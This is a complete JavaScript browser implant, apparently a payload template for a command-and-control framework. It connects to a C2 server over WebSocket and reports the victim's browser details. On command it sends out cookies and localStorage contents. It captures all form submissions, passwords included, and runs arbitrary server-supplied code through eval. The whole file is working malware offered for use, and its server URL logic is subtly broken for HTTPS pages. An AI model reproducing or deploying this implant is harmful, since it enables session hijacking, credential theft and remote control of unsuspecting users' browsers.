(function() {
    console.log("BARK Agent activated");
    
    const BARK_AGENT = {
        version: "1337",
        agentId: null,
        socket: null,
        config: {
            // Use WebSocket protocol matching the page's protocol (ws or wss)
            serverUrl: window.location.protocol === 'https:' ? 'wss:' : 'ws:' + '//localhost:8080/ws',
            heartbeatInterval: 60000, // 1 minute
            reconnectInterval: 30000, // 30 seconds
            maxReconnectAttempts: 5
        },
        
        // Initialize the agent
        init: function() {
            console.log("Agent initializing...");
            this.agentId = __BARK_AGENT_ID__;
            this.connectToC2();
            this.installHooks();
        },
        
        // Generate unique agent ID
        generateAgentId: function() {
            const timestamp = Date.now().toString(36);
            const randomStr = Math.random().toString(36).substring(2, 10);
            return `agent_${timestamp}_${randomStr}`;
        },
        
        // Get browser and system information
        getSystemInfo: function() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                cookiesEnabled: navigator.cookieEnabled,
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                referrer: document.referrer,
                currentUrl: window.location.href,
                hostname: window.location.hostname,
                localStorageAvailable: !!window.localStorage
            };
        },
        
        // Connect to C2 server
        connectToC2: function(reconnectAttempt = 0) {
            console.log("[BARK Agent] Establishing connection to C2...");
            
            try {
                this.socket = new WebSocket(this.config.serverUrl);
                
                // Connection opened
                this.socket.addEventListener('open', (event) => {
                    console.log("[BARK Agent] Connection established with C2 server");
                    
                    // Send agent activation message
                    this.sendMessage({
                        type: "agent_activation",
                        agentId: this.agentId,
                        version: this.version,
                        timestamp: new Date().toISOString(),
                        systemInfo: this.getSystemInfo()
                    });
                    
                    // Start heartbeat after successful connection
                    this.startHeartbeat();
                });
                
                // Listen for messages
                this.socket.addEventListener('message', (event) => {
                    this.handleServerMessage(event);
                });
                
                // Handle errors
                this.socket.addEventListener('error', (event) => {
                    console.error("[BARK Agent] WebSocket error:", event);
                });
                
                // Handle connection close
                this.socket.addEventListener('close', (event) => {
                    console.log("[BARK Agent] Connection closed:", event.code, event.reason);
                    
                    // Cleanup heartbeat
                    if (this.heartbeatTimer) {
                        clearInterval(this.heartbeatTimer);
                        this.heartbeatTimer = null;
                    }
                    
                    // Attempt to reconnect if this wasn't a normal closure
                    if (event.code !== 1000 && reconnectAttempt < this.config.maxReconnectAttempts) {
                        const nextAttempt = reconnectAttempt + 1;
                        console.log(`[BARK Agent] Attempting to reconnect (${nextAttempt}/${this.config.maxReconnectAttempts}) in ${this.config.reconnectInterval/1000} seconds...`);
                        
                        setTimeout(() => {
                            this.connectToC2(nextAttempt);
                        }, this.config.reconnectInterval);
                    }
                });
            } catch (error) {
                console.error("[BARK Agent] Failed to connect to C2 server:", error);
            }
        },
        
        // Send message to C2 server
        sendMessage: function(message) {
            if (this.socket && this.socket.readyState === WebSocket.OPEN) {
                try {
                    this.socket.send(JSON.stringify(message));
                    return true;
                } catch (error) {
                    console.error("[BARK Agent] Error sending message:", error);
                    return false;
                }
            }
            return false;
        },
        
        // Handle incoming messages from server
        handleServerMessage: function(event) {
            try {
                const message = JSON.parse(event.data);
                console.log("[BARK Agent] Received message:", message.type);
                
                switch (message.type) {
                    case "command":
                        this.executeCommand(message.command);
                        break;
                    case "config_update":
                        this.updateConfig(message.config);
                        break;
                    case "ping":
                        this.sendMessage({
                            type: "pong",
                            agentId: this.agentId,
                            timestamp: new Date().toISOString()
                        });
                        break;
                    default:
                        console.log("[BARK Agent] Unhandled message type:", message.type);
                }
            } catch (error) {
                console.error("[BARK Agent] Error processing message:", error);
            }
        },
        
        // Execute commands from the server
        executeCommand: function(command) {
            console.log("[BARK Agent] Executing command:", command.action);
            
            try {
                // Handle different command types
                switch (command.action) {
                    case "collect_data":
                        this.collectData();
                        break;
                    case "eval":
                        if (command.code) {
                            const result = eval(command.code);
                            this.sendMessage({
                                type: "command_result",
                                commandId: command.id,
                                result: result,
                                success: true
                            });
                        }
                        break;
                    default:
                        console.log("[BARK Agent] Unknown command:", command.action);
                }
            } catch (error) {
                console.error("[BARK Agent] Command execution error:", error);
                this.sendMessage({
                    type: "command_result",
                    commandId: command.id,
                    error: error.toString(),
                    success: false
                });
            }
        },
        
        // Update agent configuration
        updateConfig: function(newConfig) {
            if (!newConfig) return;
            
            // Update config properties
            Object.keys(newConfig).forEach(key => {
                if (this.config.hasOwnProperty(key)) {
                    this.config[key] = newConfig[key];
                }
            });
            
            console.log("[BARK Agent] Configuration updated");
            
            // Restart heartbeat with new interval if it changed
            if (newConfig.heartbeatInterval && this.heartbeatTimer) {
                this.startHeartbeat();
            }
        },
        
        // Start heartbeat mechanism
        heartbeatTimer: null,
        startHeartbeat: function() {
            // Clear existing heartbeat if any
            if (this.heartbeatTimer) {
                clearInterval(this.heartbeatTimer);
            }
            
            // Start new heartbeat interval
            this.heartbeatTimer = setInterval(() => {
                console.log("[BARK Agent] Sending heartbeat");
                this.sendMessage({
                    type: "heartbeat",
                    agentId: this.agentId,
                    timestamp: new Date().toISOString()
                });
            }, this.config.heartbeatInterval);
        },
        
        // Collect browser data
        collectData: function() {
            console.log("[BARK Agent] Collecting system data");
            
            const data = {
                systemInfo: this.getSystemInfo(),
                cookies: this.getCookies(),
                localStorage: this.getLocalStorage(),
                history: this.getHistory()
            };
            
            this.sendMessage({
                type: "data_collection",
                agentId: this.agentId,
                timestamp: new Date().toISOString(),
                data: data
            });
        },
        
        // Get cookies
        getCookies: function() {
            try {
                return document.cookie.split(';')
                    .map(cookie => cookie.trim().split('='))
                    .reduce((obj, [key, value]) => {
                        if (key) obj[key] = value;
                        return obj;
                    }, {});
            } catch (e) {
                return {};
            }
        },
        
        // Get localStorage content
        getLocalStorage: function() {
            try {
                if (!window.localStorage) return {};
                
                const storage = {};
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    storage[key] = localStorage.getItem(key);
                }
                return storage;
            } catch (e) {
                return {};
            }
        },
        
        // Get limited browser history
        getHistory: function() {
            try {
                return {
                    length: history.length,
                    current: window.location.href,
                };
            } catch (e) {
                return {};
            }
        },
        
        // Install hooks for form submissions, etc.
        installHooks: function() {
            try {
                // Monitor form submissions
                document.addEventListener('submit', (e) => {
                    const formData = {};
                    const elements = e.target.elements;
                    
                    for (let i = 0; i < elements.length; i++) {
                        const element = elements[i];
                        if (element.name && element.value) {
                            formData[element.name] = element.value;
                        }
                    }
                    
                    this.sendMessage({
                        type: "form_submission",
                        agentId: this.agentId,
                        timestamp: new Date().toISOString(),
                        url: window.location.href,
                        formData: formData
                    });
                });
                
                console.log("[BARK Agent] Hooks installed");
            } catch (error) {
                console.error("[BARK Agent] Error installing hooks:", error);
            }
        }
    };
    
    // Initialize the agent
    BARK_AGENT.init();
})();